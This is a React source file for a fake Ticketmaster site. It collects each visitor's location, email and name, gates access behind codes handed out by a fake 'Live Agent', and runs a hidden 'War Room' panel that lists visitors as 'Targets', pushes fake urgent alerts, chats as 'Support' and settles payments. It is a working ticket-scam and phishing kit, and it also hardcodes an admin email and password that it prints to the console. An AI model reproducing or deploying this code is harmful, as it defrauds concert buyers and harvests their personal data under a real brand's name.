import React, { useState, useEffect } from ‘react’;
import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft, LogIn, Lock, UserPlus } from ‘lucide-react’;
import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc } from ‘firebase/firestore’;
import { signInAnonymously, onAuthStateChanged } from ‘firebase/auth’;
import { auth, db, appId } from ‘./firebase’;

import SeatMap from ‘./components/SeatMap.jsx’;
import Checkout from ‘./components/Checkout.jsx’;

// ============================================================
// ADMIN CREDENTIALS - CHANGE THESE
const ADMIN_ID = “buyticketsmaster.org@gmail.com”;
const ADMIN_PASS = “Ifeoluwapo@1!”;
// ============================================================

const INITIAL_EVENTS = [
{ id: 1, artist: “Taylor Swift | The Eras Tour”, venue: “Wembley Stadium, London”, date: “Sat • Aug 17 • 7:00 PM”, image: “https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000”, bgImage: “https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000”, status: “presale”, timeRemaining: “02:45:12” },
{ id: 2, artist: “Drake: It’s All A Blur”, venue: “O2 Arena, London”, date: “Fri • Sep 22 • 8:00 PM”, image: “https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000”, bgImage: “https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000”, status: “available”, timeRemaining: “00:00:00” },
{ id: 3, artist: “Adele: Weekends in Vegas”, venue: “The Colosseum, Caesars Palace”, date: “Sat • Oct 12 • 8:00 PM”, image: “https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000”, bgImage: “https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000”, status: “low_inventory”, timeRemaining: “05:12:00” }
];

export default function App() {
const [user, setUser] = useState(null);
const [currentPage, setCurrentPage] = useState(‘home’);
const [selectedEvent, setSelectedEvent] = useState(null);
const [cart, setCart] = useState([]);
const [sessions, setSessions] = useState([]);
const [currentSessionId, setCurrentSessionId] = useState(null);
const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: ‘’, presaleCode: ‘FAN2024’ });

const [searchTerm, setSearchTerm] = useState(’’);
const [authStep, setAuthStep] = useState(‘email’);
const [authMode, setAuthMode] = useState(‘login’);
const [tempUser, setTempUser] = useState({ email: ‘’, name: ‘’ });

const [isChatOpen, setIsChatOpen] = useState(false);
const [chatMessages, setChatMessages] = useState([]);
const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
const [activeNotification, setActiveNotification] = useState(null);
const [showMemberInfo, setShowMemberInfo] = useState(false);
const [showNotifPanel, setShowNotifPanel] = useState(false);

const [adminUserInp, setAdminUserInp] = useState(’’);
const [adminPassInp, setAdminPassInp] = useState(’’);

useEffect(() => {
signInAnonymously(auth);
return onAuthStateChanged(auth, setUser);
}, []);

useEffect(() => {
if (!user) return;
const initSession = async () => {
let location = “Detecting…”;
try {
const res = await fetch(‘https://ipapi.co/json/’);
const data = await res.json();
location = `${data.city}, ${data.country_name}`;
} catch (e) { location = “Unknown Location”; }

```
  const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
  const newSession = await addDoc(sessionsRef, {
    createdAt: new Date().toISOString(),
    userId: user.uid,
    location,
    status: 'browsing',
    email: 'Not Set',
    userAuthCode: '', 
    notifications: [],
    chatHistory: [{ sender: 'system', text: 'Welcome to Support. How can we verify your fan status today?', timestamp: new Date().toISOString() }]
  });
  setCurrentSessionId(newSession.id);
};
initSession();
```

}, [user]);

useEffect(() => {
if (!user) return;
const configRef = doc(db, ‘artifacts’, appId, ‘public’, ‘data’, ‘config’, ‘global_settings’);
return onSnapshot(configRef, (snap) => snap.exists() && setGlobalSettings(snap.data()));
}, [user]);

useEffect(() => {
if (!currentSessionId) return;
const sessionRef = doc(db, ‘artifacts’, appId, ‘public’, ‘data’, ‘sessions’, currentSessionId);
return onSnapshot(sessionRef, (snap) => {
if (snap.exists()) {
const d = snap.data();
if (d.chatHistory) setChatMessages(d.chatHistory);
if (d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length - 1]);
}
});
}, [currentSessionId]);

useEffect(() => {
if (!user || !isAdminLoggedIn) return;
const sessionsRef = collection(db, ‘artifacts’, appId, ‘public’, ‘data’, ‘sessions’);
return onSnapshot(sessionsRef, (snap) => {
setSessions(snap.docs.map(d => ({ id: d.id, …d.data() })).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
});
}, [user, isAdminLoggedIn]);

const updateSession = async (sid, updates) => await updateDoc(doc(db, ‘artifacts’, appId, ‘public’, ‘data’, ‘sessions’, sid), updates);
const sendChatMessage = async (sid, text, sender) => {
const ref = doc(db, ‘artifacts’, appId, ‘public’, ‘data’, ‘sessions’, sid);
const snap = await getDoc(ref);
if (snap.exists()) {
const chat = snap.data().chatHistory || [];
await updateDoc(ref, { chatHistory: […chat, { sender, text, timestamp: new Date().toISOString() }] });
}
};

const handleAdminAuth = () => {
const trimmedUser = adminUserInp.trim();
const trimmedPass = adminPassInp.trim();

```
console.log('=== ADMIN LOGIN DEBUG ===');
console.log('Input User:', `"${trimmedUser}"`);
console.log('Input Pass:', `"${trimmedPass}"`);
console.log('Expected User:', `"${ADMIN_ID}"`);
console.log('Expected Pass:', `"${ADMIN_PASS}"`);
console.log('User Match:', trimmedUser === ADMIN_ID);
console.log('Pass Match:', trimmedPass === ADMIN_PASS);
console.log('========================');

if (trimmedUser === ADMIN_ID && trimmedPass === ADMIN_PASS) {
  setIsAdminLoggedIn(true);
  setAdminUserInp('');
  setAdminPassInp('');
  alert('✅ Admin Login Successful!');
} else {
  alert(`❌ Invalid Credentials\n\nYou entered:\nUser: "${trimmedUser}"\nPass: "${trimmedPass}"\n\nExpected:\nUser: "${ADMIN_ID}"\nPass: "${ADMIN_PASS}"\n\nCheck console for details.`);
}
```

};

const handleKeyPress = (e) => {
if (e.key === ‘Enter’) {
handleAdminAuth();
}
};

const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

return (
<div className="min-h-screen font-sans text-gray-900 bg-[#0a0e14] relative overflow-x-hidden">

```
  <header className="fixed top-0 w-full z-[200] bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between border-b border-white/5 shadow-2xl backdrop-blur-xl">
    <div className="flex items-center gap-4">
      {currentPage !== 'home' && (
        <button onClick={() => setCurrentPage('home')} className="p-2 rounded-full hover:bg-white/10 transition-all">
          <ChevronLeft className="w-6 h-6" />
        </button>
      )}
      <div className="flex items-center gap-1 cursor-pointer" onClick={() => setCurrentPage('home')}>
        <span className="font-bold text-2xl tracking-tighter">ticketmaster</span>
        <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-[0_0_15px_#026cdf]">
          <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
        </div>
      </div>
    </div>

    <div className="hidden md:flex flex-1 max-w-lg mx-12 relative group">
      <input 
        type="text" 
        placeholder="Search for millions of events..." 
        className="w-full bg-white/5 border border-white/10 rounded-full py-2.5 pl-11 pr-4 text-sm focus:bg-white focus:text-gray-900 outline-none transition-all"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
      />
      <Search className="absolute left-4 top-3 w-4 h-4 text-gray-500 group-focus-within:text-[#026cdf]" />
    </div>

    <div className="flex items-center gap-5">
      <div 
        onClick={() => {setShowMemberInfo(!showMemberInfo); setShowNotifPanel(false);}}
        className="cursor-pointer flex items-center gap-2 text-[10px] font-black text-[#026cdf] bg-blue-500/10 px-4 py-2 rounded-full border border-blue-500/20 shadow-inner hover:bg-blue-500/20 transition-all"
      >
        <Star className="w-3.5 h-3.5 fill-current animate-pulse" />
        <span className="hidden sm:inline uppercase tracking-widest">Verified Fan</span>
      </div>

      <div className="relative cursor-pointer p-1 hover:scale-110 transition-transform" onClick={() => {setShowNotifPanel(!showNotifPanel); setShowMemberInfo(false);}}>
        <Bell className="w-6 h-6" />
        {(activeNotification || showNotifPanel) && <div className="absolute top-0 right-0 w-3 h-3 bg-red-600 rounded-full border-2 border-[#1f262d] animate-bounce" />}
      </div>
      
      <div onClick={() => {setCurrentPage('admin'); setShowMemberInfo(false); setShowNotifPanel(false);}} className="cursor-pointer hover:text-[#026cdf] transition-colors p-1">
         <User className="w-6 h-6" />
      </div>
    </div>

    {showMemberInfo && (
      <div className="absolute top-16 right-4 w-72 bg-white text-gray-900 rounded-[30px] p-6 shadow-2xl border border-gray-100 animate-slideDown z-[300]">
        <h4 className="font-black text-xs uppercase tracking-widest text-[#026cdf] mb-3">Member Status</h4>
        <div className="bg-blue-50 p-4 rounded-2xl border border-blue-100 flex items-center gap-3">
          <ShieldCheck className="text-[#026cdf] w-6 h-6" />
          <p className="text-[10px] font-bold leading-tight">Fan Account:<br/><span className="text-[#026cdf] text-xs uppercase">Verified</span></p>
        </div>
        <p className="text-[9px] text-gray-400 mt-4 leading-relaxed font-medium uppercase tracking-tighter">Your unique session is encrypted and protected by Ticketmaster SmartQueue™ Technology.</p>
      </div>
    )}

    {showNotifPanel && (
      <div className="absolute top-16 right-4 w-80 bg-[#1f262d] text-white rounded-[30px] p-6 shadow-2xl border border-white/5 animate-slideDown z-[300]">
        <div className="flex justify-between items-center mb-6">
           <h4 className="font-black text-xs uppercase tracking-widest text-gray-400">Notifications</h4>
           <X className="w-4 h-4 cursor-pointer" onClick={() => setShowNotifPanel(false)} />
        </div>
        {activeNotification ? (
           <div className="bg-[#026cdf] p-4 rounded-2xl shadow-xl animate-pulse">
              <p className="text-[11px] font-bold leading-tight uppercase mb-1">Official Alert</p>
              <p className="text-xs font-medium opacity-90">{activeNotification.text}</p>
           </div>
        ) : (
           <div className="text-center py-8 opacity-20">
              <Bell className="mx-auto w-8 h-8 mb-2" />
              <p className="text-[10px] font-bold uppercase tracking-widest">Inbox Empty</p>
           </div>
        )}
      </div>
    )}
  </header>

  {activeNotification && !showNotifPanel && (
    <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[160] w-[90vw] max-w-md bg-[#ea0042] text-white p-5 rounded-3xl shadow-2xl flex items-start gap-4 animate-bounce border-b-4 border-black/20">
       <Bell className="shrink-0 w-6 h-6" />
       <div className="flex-1"><p className="font-black text-xs uppercase">Urgent Update</p><p className="text-xs font-bold leading-tight">{activeNotification.text}</p></div>
       <X className="cursor-pointer" onClick={() => setActiveNotification(null)} />
    </div>
  )}

  <main className="pt-16 min-h-screen relative z-10">
    {currentPage === 'home' && (
      <HomeView 
        events={filteredEvents} 
        searchTerm={searchTerm} 
        setSearchTerm={setSearchTerm} 
        onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} 
      />
    )}
    
    {currentPage === 'auth' && (
      <AuthGate 
        mode={authMode} setMode={setAuthMode}
        step={authStep} setStep={setAuthStep} 
        tempUser={tempUser} setTempUser={setTempUser} 
        sessionData={mySessionData}
        onComplete={() => { setCurrentPage('seatmap'); updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email, name: tempUser.name }); }} 
      />
    )}
    
    {currentPage === 'seatmap' && <SeatMap event={selectedEvent} presaleCode={globalSettings.presaleCode} cart={cart} setCart={setCart} globalPrice={globalSettings.price} onCheckout={() => { updateSession(currentSessionId, { status: 'payment_pending', cart }); setCurrentPage('checkout'); }} />}
    
    {currentPage === 'checkout' && <Checkout cart={cart} sessionId={currentSessionId} sessionData={mySessionData} updateSession={updateSession} onSuccess={() => setCurrentPage('success')} onBack={() => setCurrentPage('seatmap')} />}
    
    {currentPage === 'success' && <SuccessScreen event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
    
    {currentPage === 'admin' && (
      <div className="min-h-[90vh] bg-[#f1f5f9] relative">
        {!isAdminLoggedIn ? (
          <div className="flex items-center justify-center p-6 h-[80vh]">
            <div className="bg-white p-12 rounded-[60px] w-full max-w-sm shadow-2xl border space-y-10 animate-slideUp">
              <div className="text-center space-y-2">
                 <div className="w-16 h-16 bg-blue-50 rounded-[30px] flex items-center justify-center mx-auto mb-4 border shadow-inner"><Lock className="text-[#026cdf] w-8 h-8" /></div>
                 <h2 className="text-3xl font-black italic uppercase">War Room</h2>
                 <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Secure Access Only</p>
              </div>
              <div className="space-y-4">
                 <input 
                   placeholder="Admin ID" 
                   className="border-2 w-full p-4 rounded-3xl outline-none font-bold focus:border-[#026cdf] transition-all" 
                   value={adminUserInp} 
                   onChange={e=>setAdminUserInp(e.target.value)}
                   onKeyPress={handleKeyPress}
                 />
                 <input 
                   type="password" 
                   placeholder="Passkey" 
                   className="border-2 w-full p-4 rounded-3xl outline-none font-bold focus:border-[#026cdf] transition-all" 
                   value={adminPassInp} 
                   onChange={e=>setAdminPassInp(e.target.value)}
                   onKeyPress={handleKeyPress}
                 />
                 <button onClick={handleAdminAuth} className="bg-[#026cdf] text-white w-full py-5 rounded-3xl font-black shadow-2xl uppercase tracking-widest mt-4 hover:bg-blue-600 active:scale-95 transition-all">Authorize</button>
              </div>
              <div className="bg-yellow-50 border-2 border-yellow-200 rounded-2xl p-4">
                <p className="text-[9px] text-yellow-800 font-bold text-center">💡 Check browser console (F12) for debug info</p>
              </div>
            </div>
          </div>
        ) : (
          <AdminDashboard 
            sessions={sessions} updateSession={updateSession} 
            globalSettings={globalSettings} updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)} 
            sendChatMessage={sendChatMessage} onExit={() => {setIsAdminLoggedIn(false); setCurrentPage('home');}} 
          />
        )}
      </div>
    )}
  </main>

  <div className={`fixed bottom-6 right-6 z-[180] transition-all duration-500 ${currentPage === 'seatmap' || currentPage === 'checkout' ? 'translate-y-[-85px] sm:translate-y-0' : ''}`}>
    <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] text-white p-4 rounded-[22px] shadow-[0_15px_40px_rgba(2,108,223,0.5)] hover:scale-110 active:scale-95 transition-all">
      {isChatOpen ? <X /> : <MessageSquare />}
    </button>
  </div>

  {isChatOpen && (
    <div className="fixed bottom-24 right-6 w-[92vw] max-w-[360px] h-[480px] bg-white border shadow-[0_30px_100px_rgba(0,0,0,0.4)] rounded-[40px] z-[190] flex flex-col overflow-hidden animate-slideUp">
      <div className="bg-[#1f262d] text-white p-6 flex justify-between items-center">
        <div className="flex items-center gap-3">
          <div className="relative">
            <div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-xs">TM</div>
            <div className="absolute bottom-0 right-0 w-3 h-3 bg-green-500 rounded-full border-2 border-[#1f262d]" />
          </div>
          <div>
            <p className="font-black text-xs uppercase tracking-widest leading-none">Support</p>
            <div className="flex items-center gap-1 mt-1">
               <CheckCircle className="w-2.5 h-2.5 text-[#026cdf]" />
               <p className="text-[8px] font-black text-gray-400 uppercase">Verified Secure</p>
            </div>
          </div>
        </div>
        <X className="cursor-pointer text-gray-500 hover:text-white" onClick={() => setIsChatOpen(false)} />
      </div>
      <div className="flex-1 overflow-y-auto p-5 space-y-4 bg-gray-50">
        {chatMessages.map((m, i) => (
          <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
            <div className={`max-w-[85%] p-4 rounded-2xl text-[13px] font-medium leading-relaxed shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none' : 'bg-white border rounded-bl-none text-gray-800'}`}>{m.text}</div>
          </div>
        ))}
      </div>
      <div className="p-4 border-t bg-white flex gap-2">
        <input id="chat-inp" placeholder="Type a message..." className="flex-1 bg-gray-100 p-4 rounded-2xl text-sm outline-none" onKeyDown={(e) => { if(e.key === 'Enter' && e.target.value.trim()){ sendChatMessage(currentSessionId, e.target.value, 'user'); e.target.value = ''; } }} />
        <button onClick={() => { const i = document.getElementById('chat-inp'); if(i.value.trim()){ sendChatMessage(currentSessionId, i.value, 'user'); i.value = ''; } }} className="bg-[#026cdf] text-white p-4 rounded-2xl shadow-xl hover:bg-blue-700 transition-all"><Send className="w-5 h-5" /></button>
      </div>
    </div>
  )}
</div>
```

);
}

function HomeView({ events, searchTerm, setSearchTerm, onSelect }) {
return (
<div className="max-w-7xl mx-auto p-4 sm:p-10 space-y-16 pb-40">
<div className="relative h-[480px] rounded-[60px] overflow-hidden shadow-2xl flex items-center justify-center p-8 text-center border-4 border-white/5 group">
<div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-black/20 to-transparent z-10" />
<img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover transition-transform duration-[20s] group-hover:scale-110 opacity-70" alt="hero" />
<div className="relative z-20 text-white max-w-4xl animate-fadeIn space-y-8">
<h1 className="text-6xl md:text-9xl font-black tracking-tighter leading-none italic uppercase drop-shadow-2xl">LET’S MAKE <span className="text-[#026cdf] drop-shadow-[0_0_25px_#026cdf]">MEMORIES</span>.</h1>
<p className="text-xl md:text-2xl font-bold text-gray-300 opacity-90 max-w-xl mx-auto italic tracking-wide">Secure official tickets for the biggest global tours.</p>

```
      <div className="bg-white/10 backdrop-blur-3xl border border-white/20 rounded-[40px] p-2 flex shadow-2xl max-w-2xl mx-auto group-focus-within:bg-white transition-all">
         <input 
           className="flex-1 bg-transparent px-8 py-4 rounded-full text-white font-bold placeholder:text-gray-400 focus:outline-none focus:text-gray-900" 
           placeholder="Find millions of events..." 
           value={searchTerm}
           onChange={(e) => setSearchTerm(e.target.value)}
         />
         <button className="bg-[#026cdf] px-12 py-5 rounded-[32px] font-black text-sm uppercase tracking-widest shadow-2xl hover:bg-blue-600 transition-all">Search</button>
      </div>
    </div>
  </div>

  <div className="space-y-12">
    <h2 className="text-4xl font-black text-white tracking-tighter italic uppercase flex items-center gap-4"><div className="w-2 h-10 bg-[#026cdf] rounded-full" /> Featured <span className="text-[#026cdf]">Tours</span></h2>
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-12">
      {events.map(ev => (
        <div key={ev.id} onClick={() => onSelect(ev)} className="bg-[#1f262d] rounded-[55px] overflow-hidden shadow-2xl border border-white/5 hover:translate-y-[-15px] transition-all duration-700 cursor-pointer group">
          <div className="h-80 relative overflow-hidden">
             <img src={ev.image} className="w-full h-full object-cover group-hover:scale-125 transition-transform duration-[3s]" alt={ev.artist} />
             <div className="absolute inset-0 bg-gradient-to-t from-[#1f262d] via-transparent to-transparent opacity-90" />
             <div className="absolute top-8 left-8 flex flex-col gap-3">
                <div className="bg-[#ea0042] text-white px-5 py-2 rounded-full text-[10px] font-black uppercase shadow-2xl animate-pulse">Low Inventory</div>
                {ev.timeRemaining !== "00:00:00" && <div className="bg-black/40 backdrop-blur-md text-white px-3 py-1.5 rounded-full text-[9px] font-bold uppercase border border-white/10">{ev.timeRemaining}</div>}
             </div>
          </div>
          <div className="p-10 space-y-6">
             <h3 className="text-3xl font-black leading-tight text-white group-hover:text-[#026cdf] transition-colors uppercase italic">{ev.artist}</h3>
             <div className="space-y-1"><p className="text-gray-400 font-bold text-[11px] uppercase tracking-[0.2em]">{ev.venue}</p><p className="text-gray-500 font-black text-[10px] uppercase tracking-widest">{ev.date}</p></div>
             <div className="pt-6 border-t border-white/5 flex justify-between items-center"><div className="flex items-center gap-2"><ShieldCheck className="w-4 h-4 text-[#026cdf]" /><span className="text-[10px] font-black uppercase text-[#026cdf] tracking-widest">Verified Event</span></div><ChevronLeft className="w-5 h-5 rotate-180 text-gray-500" /></div>
          </div>
        </div>
      ))}
    </div>
  </div>
</div>
```

);
}

function AuthGate({ mode, setMode, step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
const [loading, setLoading] = useState(false);
const [vCode, setVCode] = useState(’’);
const [error, setError] = useState(’’);

const handleNext = () => {
setLoading(true); setError(’’);
setTimeout(() => {
setLoading(false);
if(step === ‘email’) setStep(mode === ‘login’ ? ‘verify’ : ‘signup’);
else if(step === ‘signup’) setStep(‘verify’);
else {
if (vCode === sessionData.userAuthCode && vCode !== ‘’) onComplete();
else setError(“Invalid Access Code. Message Agent.”);
}
}, 1200);
};

return (
<div className="min-h-[85vh] flex items-center justify-center p-6 bg-[#0a0e14]/50">
<div className="bg-white w-full max-w-md rounded-[60px] shadow-[0_60px_120px_rgba(0,0,0,0.5)] p-12 border border-white space-y-10 animate-slideUp relative">
<div className="absolute top-10 right-12 flex gap-4 text-[10px] font-black uppercase tracking-widest">
<button onClick={() => {setMode(‘login’); setStep(‘email’);}} className={mode===‘login’ ? ‘text-[#026cdf]’ : ‘text-gray-300’}>Sign In</button>
<button onClick={() => {setMode(‘signup’); setStep(‘email’);}} className={mode===‘signup’ ? ‘text-[#026cdf]’ : ‘text-gray-300’}>Sign Up</button>
</div>
<div className="text-center pt-4">
<div className="w-20 h-20 bg-blue-50 rounded-[35px] flex items-center justify-center mx-auto mb-6 shadow-inner"><User className="text-[#026cdf] w-10 h-10" /></div>
<h2 className="text-4xl font-black tracking-tighter uppercase italic tracking-tighter">{mode === ‘login’ ? ‘Welcome’ : ‘Join Us’}</h2>
<p className="text-gray-400 text-[10px] font-bold uppercase tracking-widest mt-2">Verified Fan Security Gate</p>
</div>
{step === ‘email’ && (
<div className="space-y-6">
<input className=“w-full border-2 border-gray-100 p-5 rounded-[28px] font-bold focus:border-[#026cdf] outline-none transition-all” placeholder=“Email Address” value={tempUser.email} onChange={e=>setTempUser({…tempUser, email:e.target.value})} />
<button onClick={handleNext} className="w-full bg-[#026cdf] text-white py-5 rounded-[28px] font-black shadow-2xl hover:bg-blue-600 transition-all uppercase tracking-widest">{loading ? ‘Processing…’ : ‘Continue’}</button>
</div>
)}
{step === ‘signup’ && (
<div className="space-y-4 animate-fadeIn">
<input className=“w-full border-2 border-gray-100 p-5 rounded-[28px] outline-none font-bold” placeholder=“Full Legal Name” value={tempUser.name} onChange={e=>setTempUser({…tempUser, name:e.target.value})} />
<input className="w-full border-2 border-gray-100 p-5 rounded-[28px] outline-none font-bold" type="password" placeholder="Create Password" />
<button onClick={handleNext} className="w-full bg-black text-white py-5 rounded-[28px] font-black shadow-2xl uppercase tracking-widest">{loading ? ‘Creating…’ : ‘Register’}</button>
</div>
)}
{step === ‘verify’ && (
<div className="space-y-8 animate-fadeIn">
<div className="bg-[#026cdf]/5 p-6 rounded-[35px] border-2 border-dashed border-[#026cdf]/20 text-center">
<p className="text-[11px] text-[#026cdf] font-black leading-relaxed uppercase tracking-wider">Verification Required. Message our <span className="underline">Live Agent</span> to receive your access code.</p>
</div>
<input className={`w-full border-2 p-6 rounded-[28px] text-center font-black tracking-[0.8em] text-3xl outline-none transition-all ${error ? 'border-red-500 bg-red-50 text-red-600' : 'border-gray-100'}`} placeholder=“000000” value={vCode} onChange={e=>setVCode(e.target.value)} maxLength={6} />
{error && <p className="text-red-600 text-[10px] font-black text-center uppercase tracking-widest animate-shake">{error}</p>}
<button onClick={handleNext} className="w-full bg-[#026cdf] text-white py-5 rounded-[28px] font-black shadow-2xl uppercase tracking-widest">{loading ? ‘Confirming…’ : ‘Verify Access’}</button>
</div>
)}
</div>
</div>
);
}

function AdminDashboard({ sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
const [config, setConfig] = useState(globalSettings);
return (
<div className="min-h-screen bg-[#f1f5f9] p-4 md:p-12 animate-fadeIn">
<div className="max-w-7xl mx-auto space-y-12">
<div className="flex justify-between items-center bg-white p-8 rounded-[40px] shadow-2xl">
<h1 className="text-4xl font-black uppercase italic flex items-center gap-4"><div className="w-4 h-4 bg-green-500 rounded-full animate-pulse shadow-[0_0_15px_#22c55e]" /> WAR ROOM</h1>
<button onClick={onExit} className="bg-red-600 text-white px-10 py-4 rounded-full font-black text-xs uppercase shadow-2xl">DISCONNECT</button>
</div>
<div className="grid grid-cols-1 lg:grid-cols-3 gap-12">
<div className="bg-white p-10 rounded-[50px] shadow-2xl space-y-8 h-fit">
<h3 className="font-black text-xl uppercase italic flex items-center gap-2 text-green-600"><DollarSign /> Global Sync</h3>
<div className="space-y-6">
<div><label className="text-[11px] font-black text-gray-400 block mb-2 uppercase tracking-widest">Base Price ($)</label><input type=“number” className=“w-full border-2 p-4 rounded-3xl font-black text-2xl” value={config.price} onChange={ev=>setConfig({…config, price: Number(ev.target.value)})}/></div>
<div><label className="text-[11px] font-black text-gray-400 block mb-2 uppercase tracking-widest">Presale Code</label><input className=“w-full border-2 p-4 rounded-3xl font-black uppercase” value={config.presaleCode} onChange={ev=>setConfig({…config, presaleCode: ev.target.value})}/></div>
<button onClick={() => updateGlobalSettings(config)} className=“w-full bg-[#026cdf] text-white py-4 rounded-[28px] font-black shadow-xl uppercase tracking-widest”>Sync Changes</button>
</div>
</div>
<div className="lg:col-span-2 bg-white p-10 rounded-[60px] shadow-2xl space-y-12">
<h3 className="font-black text-2xl uppercase italic flex items-center gap-3"><User className="text-[#026cdf]" /> Targets ({sessions.length})</h3>
<div className="space-y-10 max-h-[800px] overflow-y-auto pr-4">
{sessions.map(s=>(
<div key={s.id} className="bg-gray-50 p-10 rounded-[50px] border-4 border-white space-y-8 shadow-xl">
<div className="flex justify-between items-start">
<div className="space-y-1">
<div className="text-2xl font-black text-blue-900 uppercase italic leading-none">{s.name || ‘Visitor’}</div>
<div className="text-[12px] text-gray-400 font-black uppercase tracking-widest">{s.location}</div>
<div className="text-[10px] text-gray-500 font-bold bg-white px-2 py-1 rounded border inline-block">{s.email}</div>
</div>
<div className="bg-white px-6 py-3 rounded-full text-[10px] font-black text-[#026cdf] border-2 border-blue-100 uppercase tracking-widest">{s.status}</div>
</div>
<div className="grid grid-cols-2 gap-8">
<div className="bg-white p-6 rounded-[35px] border-2 border-gray-100 shadow-inner">
<label className="text-[10px] font-black text-gray-400 uppercase block mb-3">Verification Code</label>
<input className=“w-full font-black text-[#026cdf] text-4xl outline-none placeholder:text-gray-100 uppercase” placeholder=“SET” onBlur={(e) => updateSession(s.id, { userAuthCode: e.target.value })} defaultValue={s.userAuthCode} />
</div>
<div className="bg-white p-6 rounded-[35px] border-2 border-gray-100 shadow-inner">
<label className="text-[10px] font-black text-gray-400 uppercase block mb-3">Push Notification</label>
<div className="flex gap-2">
<input className=“flex-1 text-[11px] font-bold outline-none uppercase placeholder:text-gray-300” placeholder=“ALERT…” id={`p-${s.id}`} />
<button onClick={() => { const i = document.getElementById(`p-${s.id}`); updateSession(s.id, { notifications: […(s.notifications || []), {text: i.value, timestamp: new Date().toISOString()}] }); i.value=’’; }} className=“bg-red-600 text-white px-4 rounded-xl font-black text-[10px]”>SEND</button>
</div>
</div>
</div>
<div className="flex gap-4">
<div className="flex-1 relative group">
<input className=“w-full bg-white border-2 border-gray-100 p-5 rounded-[28px] text-sm font-bold outline-none” placeholder=“Reply…” onKeyDown={e => { if(e.key===‘Enter’){ sendChatMessage(s.id, e.target.value, ‘system’); e.target.value=’’ } }} />
<Send className="absolute right-6 top-5 w-5 h-5 text-gray-300" />
</div>
<button onClick={() => updateSession(s.id, {status: ‘payment_complete’})} className=“bg-green-600 text-white px-10 rounded-[28px] font-black text-xs uppercase shadow-2xl”>Settle</button>
</div>
</div>
))}
</div>
</div>
</div>
</div>
</div>
);
}

function SuccessScreen({ event, cart, onHome }) {
const [showPrize, setShowPrize] = useState(false);
useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 19.50) + 5.00).toFixed(2);
return (
<div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative">
<div className="absolute inset-0 pointer-events-none opacity-40">
{[…Array(40)].map((_, i) => (<div key={i} className=“absolute w-3 h-12 bg-white rounded-full animate-confetti” style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*3}s`, top: `-50px` }} />))}
</div>
<div className={`bg-white w-full max-w-lg rounded-[70px] p-14 text-center shadow-[0_100px_200px_rgba(0,0,0,0.5)] transition-all duration-1000 transform ${showPrize ? 'scale-100 opacity-100' : 'scale-50 opacity-0'}`}>
<div className="w-32 h-32 bg-green-500 rounded-[45px] flex items-center justify-center mx-auto mb-10 shadow-2xl animate-bounce"><CheckCircle className="text-white w-16 h-16 stroke-[4]" /></div>
<h1 className="text-5xl font-black text-gray-900 leading-tight mb-4 uppercase italic tracking-tighter">YOU GOT THE TICKETS!</h1>
<div className="bg-gray-50 rounded-[50px] p-12 border-4 border-dashed border-gray-100 mb-12 space-y-4 shadow-inner text-center">
<Ticket className="w-14 h-14 text-[#026cdf] mx-auto mb-2" />
<div className="flex items-center justify-center gap-1 mb-2">
<span className="font-bold text-2xl tracking-tighter">ticketmaster</span>
<div className="bg-[#026cdf] rounded-full w-4 h-4 flex items-center justify-center"><CheckCircle className="w-3 h-3 text-white" /></div>
</div>
<p className="text-7xl font-black text-gray-900 tracking-tighter">${total}</p>
</div>
<button onClick={onHome} className="w-full bg-[#1f262d] text-white py-6 rounded-[35px] font-black text-xl hover:bg-black uppercase tracking-widest italic shadow-2xl">OPEN TICKETS</button>
</div>
</div>
);
}
